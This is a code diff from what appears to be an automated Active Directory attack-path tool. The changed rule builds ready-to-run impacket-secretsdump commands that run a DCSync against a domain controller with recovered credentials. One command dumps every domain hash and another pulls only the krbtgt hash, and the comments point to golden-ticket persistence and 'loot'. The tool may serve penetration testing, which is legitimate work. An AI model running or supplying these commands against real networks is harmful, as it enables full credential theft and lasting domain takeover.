@@ -714,9 +714,14 @@ def run(report, store, ui=None):
                 crit=10, conf=0.95, ready=1.5, prox=1.0,         # score 14.25
                 commands=[
                     f"# BloodHound flags {ulc} as tier-0{via_note}",
+                    # iter-54: two variants - full dump for immediate loot,
+                    # or targeted krbtgt-only for fast R-GOLDEN cascade.
                     f"impacket-secretsdump '{_dom_ac}/{ulc}:{pw}'@{_dc_ac}",
-                    f"# if that works you have every domain hash - proceed to "
-                    f"R-GOLDEN for persistence",
+                    f"# or targeted (just krbtgt for R-GOLDEN):",
+                    f"impacket-secretsdump -just-dc-user krbtgt "
+                    f"'{_dom_ac}/{ulc}:{pw}'@{_dc_ac}",
+                    f"# if either works you have DA - proceed to R-GOLDEN "
+                    f"for persistence",
                 ], src=best_src, line=best_line))
 
     # iter-35: R-GOLDEN - krbtgt NT hash was recovered (from NTDS DCSync or
